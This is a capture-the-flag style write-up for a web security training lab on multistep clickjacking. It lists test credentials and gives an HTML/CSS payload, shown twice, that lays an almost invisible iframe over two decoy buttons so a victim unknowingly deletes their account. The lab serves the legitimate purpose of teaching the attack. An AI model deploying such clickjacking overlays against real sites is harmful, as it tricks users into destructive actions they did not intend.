# Lab: Multistep clickjacking (Practitioner)

**Goal:** Make the victim click both "Delete account" and the subsequent confirmation "Yes" button using two decoy elements.

**Credentials:** `wiener:peter`

## Vulnerability
Account deletion requires two clicks (button + confirmation dialog). Both can be framed and overlaid.

## Solution

Use two absolutely positioned decoy divs.

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    .firstClick, .secondClick {
        position: absolute;
        top: 330px;
        left: 50px;
        z-index: 1;
    }
    .secondClick {
        top: 285px;
        left: 225px;
    }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

### Steps
1. Start with opacity 0.1.
2. Align "Click me first" over the Delete account button (suggested: top 330px, left 50px).
3. Click it (in test view) so the confirmation appears, then align "Click me next" over the Yes button (suggested: top 285px, left 225px).
4. Set opacity to 0.0001, change texts to final decoys, Store, Deliver to victim.

## Final Exploit Payload
```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    .firstClick, .secondClick {
        position: absolute;
        top: 330px;
        left: 50px;
        z-index: 1;
    }
    .secondClick {
        top: 285px;
        left: 225px;
    }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```
